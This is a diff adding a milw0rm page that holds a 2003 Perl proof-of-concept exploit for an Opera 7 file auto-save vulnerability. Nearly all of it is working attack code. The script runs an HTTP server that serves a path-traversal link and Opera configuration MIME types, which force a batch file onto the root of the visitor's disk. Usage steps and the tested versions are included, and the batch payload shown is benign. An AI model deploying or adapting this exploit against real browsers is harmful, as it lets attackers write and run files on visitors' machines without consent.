@@ -1,0 +1,115 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+#!/usr/bin/perl
+##################################################
+#
+# Sample code of
+#   &quot;[Opera 7] Arbitrary File Auto-Saved Vulnerability.&quot;
+#   
+#   This Exploit will run a webserver that will create and execute a batch 
+#   file on the victim's computer when visiting this malicious server
+#
+#   This perl script is a small HTTP server for a check ofthe vulnerability.
+#   BTW, you can exploit this vulnerability without a server like this 
+#   if your apache or etc., allow a request URL that contains '..'.
+#
+# Tested on :
+#   Opera 7.22
+#   Opera 7.21
+#   Opera 7.20
+#   Opera 7.1X
+#   Opera 7.0X
+#
+#   with Active Perl 5.8.0 on Windows 2000 Pro SP4 JP.
+#   (maybe need Perl 5.6 or later)
+#
+# Usage :
+#  [0] Execute &quot;perl this_script 10080&quot; on a console,
+#      this server starts to listen in port 10080.
+#  [1] Opera opens &quot;http://127.0.0.1:10080/&quot;.
+#  [2] Click link.
+#  [3] Auto-saved an arbitrary file on a root directory
+#      of Local Disk ...
+#
+# 2003/11/15
+# written by nesumin &lt;nesumin softhome net&gt;
+# public on www.k-otik.com
+#
+###################################################
+use HTTP::Daemon;
+use HTTP::Status;
+
+use constant URL =&gt; '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C_opera_.bat';
+
+use constant FILE_CONTENT =&gt; qq~\@echo off\x0D\x0Aecho &quot;Love &amp; Peace :-)&quot;\x0D\x0A\@pause~;
+use constant RES_HEADERS =&gt; qw(Pragma no-cache Connection close);
+use constant REUSE =&gt; 1;
+use constant VIEW_DATA =&gt; 0;
+
+
+my @MIMETYPES = qw(
+application/x-opera-configuration-keyboard
+application/x-opera-configuration-menu
+application/x-opera-configuration-mouse
+application/x-opera-configuration-toolbar
+application/x-opera-configuration-skin
+application/x-opera-skin
+);
+my $port = ($ARGV[0] || 10080) + 0;
+die(&quot;port is not correct&quot;) unless (0 &lt; $port &amp;&amp; $port &lt; 65536);
+
+my $daemon = new HTTP::Daemon(LocalPort=&gt;$port, Reuse=&gt;REUSE)
+or die(&quot;HTTP::Daemon-&gt;new() error : $!.\n&quot;);
+select(STDERR);
+printf(&quot;[*] server started on %d.\n&quot;, $daemon-&gt;sockport());
+
+while (my $ccon = $daemon-&gt;accept()) {
+printf(&quot;[*] incoming client : from %s:%d(%08X).\n&quot;,
+ inet_ntoa($ccon-&gt;peeraddr()), $ccon-&gt;peerport(), $ccon);
+if (my $req = $ccon-&gt;get_request()) {
+ print(&quot;\n[*] request received...\n&quot;, map{&quot; &gt;&gt;  $_\n&quot;}
+  ($req-&gt;as_string() =~ /^([^\r\n]+)/mg)) if (VIEW_DATA);
+ if ($req-&gt;method eq 'GET') {
+  my $url = URL;
+  my $res = new HTTP::Response(200, 'OK', new HTTP::Headers(RES_HEADERS));
+  $res-&gt;protocol(&quot;HTTP/1.0&quot;);
+  if ($req-&gt;url-&gt;path eq '/') {
+   $res-&gt;header('Content-type'=&gt;'text/html');
+   $res-&gt;content(qq~&lt;a href=&quot;$url&quot;&gt;Click here&lt;/a&gt;~);
+  
+  } else {
+
+   my $mimetype = $MIMETYPES[rand(@MIMETYPES)];
+   if ($req-&gt;header('User-Agent')=~m~Opera[\s+/]((\d\.\d)\d)~i){
+    # Opera 7.0x
+    if ($2 eq &quot;7.0&quot;) {
+     $url .= '*.zip';# '*' is a special char :-)
+     $mimetype = $MIMETYPES[$#MIMETYPES];
+    # Opera 7.22
+    } elsif ($1 eq &quot;7.22&quot;) {
+     $mimetype = $MIMETYPES[rand(@MIMETYPES-2)];
+    }
+   }
+
+   $res-&gt;header('Content-type'=&gt;$mimetype);
+   $res-&gt;content(FILE_CONTENT);
+  }
+  $ccon-&gt;send_response($res);
+  print(&quot;\n[*] response sent...\n&quot;, map{&quot; &gt;&gt;  $_\n&quot;}
+   ($res-&gt;as_string() =~ /^([^\r\n]+)/mg)) if (VIEW_DATA);
+ } else {
+  $ccon-&gt;send_error(RC_METHOD_NOT_ALLOWED);
+ }
+}
+printf(&quot;[*] client closed : from %s:%d (%08X).\n&quot;,
+ inet_ntoa($ccon-&gt;peeraddr()), $ccon-&gt;peerport(), $ccon);
+$ccon-&gt;close();
+undef($ccon);
+}
+print(&quot;[*] server closed.\n&quot;);
+$daemon-&gt;close();
+undef($daemon);</pre>
+//downloaded from milw0rm.com
+</html>
